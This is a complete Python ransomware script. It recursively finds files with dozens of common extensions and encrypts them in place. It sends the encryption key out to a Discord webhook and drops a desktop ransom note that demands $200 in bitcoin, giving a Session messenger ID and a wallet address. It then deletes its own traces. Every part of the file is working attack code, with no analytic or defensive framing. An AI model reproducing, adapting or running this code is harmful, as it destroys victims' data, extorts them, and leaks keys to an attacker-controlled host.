import os
import base64
import requests
from cryptography.fernet import Fernet
from pathlib import Path

# Generate a secure encryption key
key = Fernet.generate_key()

# Create a Fernet cipher object
cipher = Fernet(key)

# List of important directories and file extensions to target
important_directories = [
    '/path/to/important/directory1',
    '/path/to/important/directory2'
]

target_extensions = [
    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg',
    '.png', '.mp4', '.mp3', '.zip', '.rar', '.7z', '.sql', '.db',
    '.psd', '.ai', '.ppt', '.pptx', '.key', '.pages', '.numbers',
    '.csv', '.json', '.xml', '.html', '.htm', '.log', '.bak',
    '.dmg', '.pkg', '.app', '.exe', '.msi', '.iso', '.tar', '.gz',
    '.bz2', '.xz', '.deb', '.rpm', '.py', '.js', '.css', '.php',
    '.c', '.cpp', '.h', '.java', '.class', '.rb', '.go', '.rs',
    '.md', '.rtf', '.odt', '.ods', '.odp', '.tex', '.wpd', '.wps',
    '.mdb', '.accdb', '.dbf', '.mdf', '.sqlite', '.apk', '.ipa',
    '.ttf', '.otf', '.woff', '.woff2', '.eot', '.svg', '.eps',
    '.avi', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.3gp',
    '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.aiff',
    '.ps', '.eps', '.indd', '.cr2', '.nef', '.arw', '.dng',
    '.3ds', '.max', '.mb', '.ma', '.blend', '.obj', '.fbx', '.stl'
]

# Ransom note content
ransom_note = """╔══════════════════════════════════════════════════════════════╗
║                    ⚠️  IMPORTANT NOTICE ⚠️                    ║
║                 YOUR FILES HAVE BEEN ENCRYPTED               ║
╚══════════════════════════════════════════════════════════════╝

🔐 ALL YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED

📱 TO RECOVER YOUR FILES:

1. Download Session Messenger (session.org)
2. Contact this Session ID: 056e8ece091b705ef5be93db4b0deea01061a2b58caf270a5c71bf513f6e50c53d
3. send $200usd to this BITCOIN address: bc1q7en8xeq5nevt9m6wjq6julscdhywu20ljphls2

❌ DO NOT:
- Attempt to decrypt files yourself
- Modify encrypted files (.3click extension)
- Delete any files
- Restart your computer multiple times

⚠️  ATTEMPTS TO SELF-DECRYPT MAY RESULT IN PERMANENT DATA LOSS"""

# Function to encrypt a file
def encrypt_file(file_path, cipher):
    with open(file_path, 'rb') as file:
        data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

# Function to send the decryption key to a Discord webhook
def send_key_to_discord(webhook_url, key):
    payload = {
        "content": f"Decryption Key: {key.decode('utf-8')}"
    }
    response = requests.post(webhook_url, json=payload)
    if response.status_code != 204:
        raise Exception(f"Failed to send message to Discord: {response.status_code} {response.text}")

# Function to delete all traces of the script and its operations
def delete_traces():
    if os.path.exists('script.py'):
        os.remove('script.py')
    if os.path.exists('key.key'):
        os.remove('key.key')

# Function to create or append the ransom note to a file
def create_ransom_note(file_path):
    with open(file_path, 'w') as note_file:
        note_file.write(ransom_note)

# Function to recursively search for files with specific extensions
def find_files(directories, extensions):
    files_to_encrypt = []
    for directory in directories:
        for ext in extensions:
            for file_path in Path(directory).rglob(f'*{ext}'):
                files_to_encrypt.append(str(file_path))
    return files_to_encrypt

# Main script execution
if __name__ == "__main__":
    # Find important files
    files_to_encrypt = find_files(important_directories, target_extensions)

    # Encrypt each important file
    for file in files_to_encrypt:
        encrypt_file(file, cipher)

    # Send the decryption key to the specified Discord webhook
    webhook_url = "https://discord.com/api/webhooks/1412226221336559669/9OYAf2jZxSz_PEYcsmGEQKbT51Bw8mxP3RsOFpUUYV1w_YOZTRwT-PhLhvn50H4ngjjh"
    send_key_to_discord(webhook_url, key)

    # Create or append the ransom note to the desktop
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop', '3.txt')
    create_ransom_note(desktop_path)

    # Delete all traces of the script and its operations
    delete_traces()